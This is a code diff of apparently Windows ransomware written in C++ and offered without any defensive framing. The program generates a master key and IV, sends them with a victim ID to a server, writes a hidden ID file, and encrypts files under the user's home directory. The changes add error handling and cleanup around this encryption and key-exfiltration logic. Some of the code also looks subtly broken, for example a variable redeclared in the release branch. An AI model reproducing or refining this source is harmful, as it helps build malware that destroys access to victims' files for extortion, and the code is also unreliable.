@@ -26,15 +26,28 @@ int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 	PBYTE masterIV, masterKey;
 	Status status = generateKeyAndIV(&masterIV, &masterKey);
-
-	PBYTE id = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ID_LEN);
+	string path = ROOT_DIR;
+	string pathToID = get_home() + R"(\SquanchedID.id)";
+	std::ofstream IDFile;
+	PBYTE id = nullptr;
+	if (!NT_SUCCESS(status))
+	{
+		goto CLEAN;
+	}
+	 id = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ID_LEN);
 	if (NULL == id) {
-		//TODO handle error
+		goto CLEAN;
 	}
 	status = BCryptGenRandom(NULL, id, ID_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
-	//TODO Check STATUS
+	if(!NT_SUCCESS(status))
+	{
+		goto CLEAN;
+	}
 	status = sendIVAndKeyToServer(masterIV,masterKey,id);
-	//TODO Check STATUS
+	if(!NT_SUCCESS(status))
+	{
+		goto CLEAN;
+	}
 //	destroyVSS();
 	changeHiddenFileState(false);
 
@@ -46,9 +59,8 @@ int main(int argc, char* argv[]) {
 //	DWORD attributes = GetFileAttributes(pathToMasters.c_str());
 //	SetFileAttributes(pathToMasters.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
 //	masterKeyIVFile.close();
-
-	string pathToID = get_home()+R"(\SquanchedID.id)";
-	std::ofstream IDFile;
+	
+	
 	IDFile.open(pathToID, std::ios::binary);
 	IDFile.write((char*)id, ID_LEN);
 	DWORD attributes = GetFileAttributes(pathToID.c_str());
@@ -58,7 +70,7 @@ int main(int argc, char* argv[]) {
 	changeHiddenFileState(true);
 	
 #ifdef DEBUG
-	string path = ROOT_DIR;
+	
 #else
 	string path = get_home();
 #endif
@@ -78,7 +90,13 @@ int main(int argc, char* argv[]) {
 //	notify();
 //
 
-	//TODO clean id,masterKey,masterIV
+CLEAN:
+	if (masterKey)
+		HeapFree(GetProcessHeap(), 0, masterKey);
+	if (masterIV)
+		HeapFree(GetProcessHeap(), 0, masterIV);
+	if (id)
+		HeapFree(GetProcessHeap(), 0, id);
 	return 0;
 }
 
@@ -131,18 +149,19 @@ DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE 
 	BCRYPT_KEY_HANDLE keyHandle = nullptr;
 	status = getKeyHandle(masterKey, keyHandle, aesHandle);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		return status;
 	}
 	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
 	if (NULL == tmpIv) {
-		//cleanup
+		HeapFree(GetProcessHeap(), 0, tmpIv);
+		return STATUS_UNSUCCESSFUL;
 	}
 	memcpy(tmpIv, masterIV, IV_LEN);
 	DWORD  resSize;
 
 	status = BCryptEncrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, NULL, tmpIv, IV_LEN, *buff, KEY_LEN + IV_LEN, &resSize, 0);
 	if (!NT_SUCCESS(status)) {
-		//TODO cleanup
+		return status;
 	}
 	return status;
 }
@@ -249,6 +268,8 @@ void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 	BCRYPT_ALG_HANDLE aesHandle = nullptr;
 	BCRYPT_KEY_HANDLE keyHandle = nullptr;
 
+	PBYTE keyIVBuff = nullptr;
+	PBYTE keyIV = nullptr;
 	PBYTE cipherText = nullptr;
 	if(!initPlainText(path, &plainText, plainTextLen)) {
 		goto CLEANUP;
@@ -297,22 +318,25 @@ void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 #ifdef DEBUG
 	std::cout << "Ciphertext:\t" << cipherText << std::endl;
 #endif
-	PBYTE keyIVBuff = nullptr;
-	PBYTE keyIV = nullptr;
+
 	keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN );
 	if(keyIVBuff == nullptr)
 	{
-		//TODO cleanup
+		goto CLEANUP;
 	}
 	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
 	if (keyIV == nullptr)
 	{
-		//TODO cleanup
+		goto CLEANUP;
 	}
 	memcpy(keyIV,key,KEY_LEN);
 	memcpy(keyIV + KEY_LEN, iv, IV_LEN);
 	
 	status = encryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
+	if(!NT_SUCCESS(status))
+	{
+		goto CLEANUP;
+	}
 	writeToFile(path, cipherText, cipherSize, keyIVBuff, plainTextLen);
 	
 CLEANUP:
@@ -328,6 +352,10 @@ CLEANUP:
 		BCryptDestroyKey(keyHandle);
 	if (cipherText)
 		HeapFree(GetProcessHeap(), 0, cipherText);
+	if(keyIV)
+		HeapFree(GetProcessHeap(), 0, keyIV);
+	if (keyIVBuff)
+		HeapFree(GetProcessHeap(), 0, keyIVBuff);
 }
 
 
